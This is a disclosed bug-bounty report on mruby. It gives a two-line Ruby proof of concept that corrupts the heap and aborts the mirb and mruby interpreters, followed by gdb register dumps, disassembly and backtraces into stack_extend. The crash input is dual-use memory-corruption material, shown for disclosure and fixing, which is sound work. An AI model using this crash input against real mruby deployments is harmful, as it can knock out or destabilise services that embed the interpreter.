# SIGABRT - mirb and mruby

## Report Details
- **Report ID**: 214000
- **URL**: https://hackerone.com/reports/214000
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-16T19:48:59.159Z
- **Disclosed**: 2017-05-13T21:31:30.463Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as test.rb):

	def method_missing(m,*)e self.ff||=00end
	e

Debug - mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb
	Reading symbols from ./mirb...done.
	(gdb) r test.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mirb test.rb
	mirb - Embeddable Interactive Ruby Shell

	 => :method_missing
	*** Error in `/home/x/Desktop/test/mruby/bin/mirb': realloc(): invalid next size: 0x0000000000710cb0 ***

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) info reg
	rax            0x0	0
	rbx            0x69	105
	rcx            0xffffffffffffffff	-1
	rdx            0x6	6
	rsi            0x2613	9747
	rdi            0x2613	9747
	rbp            0x7fffffffc2b0	0x7fffffffc2b0
	rsp            0x7fffffffbf18	0x7fffffffbf18
	r8             0x3062633031373030	3486458120173465648
	r9             0x75726d2f74736574	8462946700367193460
	r10            0x8	8
	r11            0x246	582
	r12            0x7fffffffc0c0	140737488339136
	r13            0x7	7
	r14            0x69	105
	r15            0x7	7
	rip            0x7ffff7744f79	0x7ffff7744f79 <__GI_raise+57>
	eflags         0x246	[ PF ZF IF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) disas
	Dump of assembler code for function __GI_raise:
	   0x00007ffff7744f40 <+0>:	mov    %fs:0x2d4,%eax
	   0x00007ffff7744f48 <+8>:	mov    %eax,%ecx
	   0x00007ffff7744f4a <+10>:	mov    %fs:0x2d0,%esi
	   0x00007ffff7744f52 <+18>:	test   %esi,%esi
	   0x00007ffff7744f54 <+20>:	jne    0x7ffff7744f88 <__GI_raise+72>
	   0x00007ffff7744f56 <+22>:	mov    $0xba,%eax
	   0x00007ffff7744f5b <+27>:	syscall 
	   0x00007ffff7744f5d <+29>:	mov    %eax,%ecx
	   0x00007ffff7744f5f <+31>:	mov    %eax,%fs:0x2d0
	   0x00007ffff7744f67 <+39>:	mov    %eax,%esi
	   0x00007ffff7744f69 <+41>:	movslq %edi,%rdx
	   0x00007ffff7744f6c <+44>:	movslq %esi,%rsi
	   0x00007ffff7744f6f <+47>:	movslq %ecx,%rdi
	   0x00007ffff7744f72 <+50>:	mov    $0xea,%eax
	   0x00007ffff7744f77 <+55>:	syscall 
	=> 0x00007ffff7744f79 <+57>:	cmp    $0xfffffffffffff000,%rax
	   0x00007ffff7744f7f <+63>:	ja     0x7ffff7744f9a <__GI_raise+90>
	   0x00007ffff7744f81 <+65>:	repz retq 
	   0x00007ffff7744f83 <+67>:	nopl   0x0(%rax,%rax,1)
	   0x00007ffff7744f88 <+72>:	test   %eax,%eax
	   0x00007ffff7744f8a <+74>:	jg     0x7ffff7744f69 <__GI_raise+41>
	   0x00007ffff7744f8c <+76>:	mov    %eax,%ecx
	   0x00007ffff7744f8e <+78>:	neg    %ecx
	   0x00007ffff7744f90 <+80>:	test   $0x7fffffff,%eax
	   0x00007ffff7744f95 <+85>:	cmove  %esi,%ecx
	   0x00007ffff7744f98 <+88>:	jmp    0x7ffff7744f69 <__GI_raise+41>
	   0x00007ffff7744f9a <+90>:	mov    0x387ec7(%rip),%rdx        # 0x7ffff7acce68
	   0x00007ffff7744fa1 <+97>:	neg    %eax
	   0x00007ffff7744fa3 <+99>:	mov    %eax,%fs:(%rdx)
	   0x00007ffff7744fa6 <+102>:	or     $0xffffffffffffffff,%rax
	   0x00007ffff7744faa <+106>:	retq   
	End of assembler dump.
	(gdb) x/x $rax
	0x0:	Cannot access memory at address 0x0

Backtrace - mirb
-------------------

	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff77821d4 in __libc_message (do_abort=do_abort@entry=1, fmt=fmt@entry=0x7ffff7890a10 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
	#3  0x00007ffff778cf37 in malloc_printerr (action=<optimized out>, str=0x7ffff788cc07 "realloc(): invalid next size", ptr=<optimized out>) at malloc.c:4996
	#4  0x00007ffff7790777 in _int_realloc (av=<optimized out>, oldp=0x710ca0, oldsize=<optimized out>, nb=<optimized out>) at malloc.c:4234
	#5  0x00007ffff7791e09 in __GI___libc_realloc (oldmem=0x710cb0, bytes=12288) at malloc.c:3029
	#6  0x000000000042ce50 in mrb_default_allocf (mrb=0x6b0010, p=0x710cb0, size=12288, ud=0x0) at /home/x/Desktop/test/mruby/src/state.c:60
	#7  0x0000000000434ff2 in mrb_realloc_simple (mrb=0x6b0010, p=0x710cb0, len=12288) at /home/x/Desktop/test/mruby/src/gc.c:201
	#8  0x0000000000435074 in mrb_realloc (mrb=0x6b0010, p=0x710cb0, len=12288) at /home/x/Desktop/test/mruby/src/gc.c:215
	#9  0x0000000000406489 in stack_extend_alloc (mrb=0x6b0010, room=8, keep=3) at /home/x/Desktop/test/mruby/src/vm.c:161
	#10 0x000000000040659d in stack_extend (mrb=0x6b0010, room=8, keep=3) at /home/x/Desktop/test/mruby/src/vm.c:181
	#11 0x000000000040a3c6 in mrb_vm_exec (mrb=0x6b0010, proc=0x6b2d70, pc=0x71ed30) at /home/x/Desktop/test/mruby/src/vm.c:1297
	#12 0x000000000040847f in mrb_vm_run (mrb=0x6b0010, proc=0x6b2d10, self=..., stack_keep=1) at /home/x/Desktop/test/mruby/src/vm.c:820
	#13 0x0000000000402b90 in main (argc=2, argv=0x7fffffffe088) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

Debug - mruby
-------------------

	x@x:~/Desktop/test/mruby/bin$ gdb -q ./mruby
	Reading symbols from ./mruby...done.
	(gdb) r test.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mruby test.rb
	*** Error in `/home/x/Desktop/test/mruby/bin/mruby': realloc(): invalid next size: 0x000000000071b1f0 ***

	Program received signal SIGABRT, Aborted.
	0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	56	../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
	(gdb) info reg
	rax            0x0	0
	rbx            0x6a	106
	rcx            0xffffffffffffffff	-1
	rdx            0x6	6
	rsi            0x3b28	15144
	rdi            0x3b28	15144
	rbp            0x7fffffffd4a0	0x7fffffffd4a0
	rsp            0x7fffffffd108	0x7fffffffd108
	r8             0x3066316231373030	3487529259247284272
	r9             0x796275726d2f7473	8746682560625472627
	r10            0x8	8
	r11            0x246	582
	r12            0x7fffffffd2b0	140737488343728
	r13            0x7	7
	r14            0x6a	106
	r15            0x7	7
	rip            0x7ffff7744f79	0x7ffff7744f79 <__GI_raise+57>
	eflags         0x246	[ PF ZF IF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) x/x $rax
	0x0:	Cannot access memory at address 0x0

Backtrace - mruby
-------------------

	(gdb) bt
	#0  0x00007ffff7744f79 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
	#1  0x00007ffff7748388 in __GI_abort () at abort.c:89
	#2  0x00007ffff77821d4 in __libc_message (do_abort=do_abort@entry=1, fmt=fmt@entry=0x7ffff7890a10 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
	#3  0x00007ffff778cf37 in malloc_printerr (action=<optimized out>, str=0x7ffff788cc07 "realloc(): invalid next size", ptr=<optimized out>) at malloc.c:4996
	#4  0x00007ffff7790777 in _int_realloc (av=<optimized out>, oldp=0x71b1e0, oldsize=<optimized out>, nb=<optimized out>) at malloc.c:4234
	#5  0x00007ffff7791e09 in __GI___libc_realloc (oldmem=0x71b1f0, bytes=12288) at malloc.c:3029
	#6  0x000000000042a0b8 in mrb_default_allocf (mrb=0x6af010, p=0x71b1f0, size=12288, ud=0x0) at /home/x/Desktop/test/mruby/src/state.c:60
	#7  0x000000000043225a in mrb_realloc_simple (mrb=0x6af010, p=0x71b1f0, len=12288) at /home/x/Desktop/test/mruby/src/gc.c:201
	#8  0x00000000004322dc in mrb_realloc (mrb=0x6af010, p=0x71b1f0, len=12288) at /home/x/Desktop/test/mruby/src/gc.c:215
	#9  0x0000000000406261 in stack_extend_alloc (mrb=0x6af010, room=8, keep=3) at /home/x/Desktop/test/mruby/src/vm.c:161
	#10 0x0000000000406375 in stack_extend (mrb=0x6af010, room=8, keep=3) at /home/x/Desktop/test/mruby/src/vm.c:181
	#11 0x000000000040a19e in mrb_vm_exec (mrb=0x6af010, proc=0x6b1d40, pc=0x71de10) at /home/x/Desktop/test/mruby/src/vm.c:1297
	#12 0x0000000000408257 in mrb_vm_run (mrb=0x6af010, proc=0x6b1d70, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:820
	#13 0x000000000041068f in mrb_top_run (mrb=0x6af010, proc=0x6b1d70, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:2617
	#14 0x0000000000445896 in mrb_load_exec (mrb=0x6af010, p=0x70be80, c=0x70aad0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5760
	#15 0x000000000044592c in mrb_load_file_cxt (mrb=0x6af010, f=0x70bac0, c=0x70aad0) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5769
	#16 0x0000000000402415 in main (argc=2, argv=0x7fffffffe078) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227

## Attachments
- test.rb
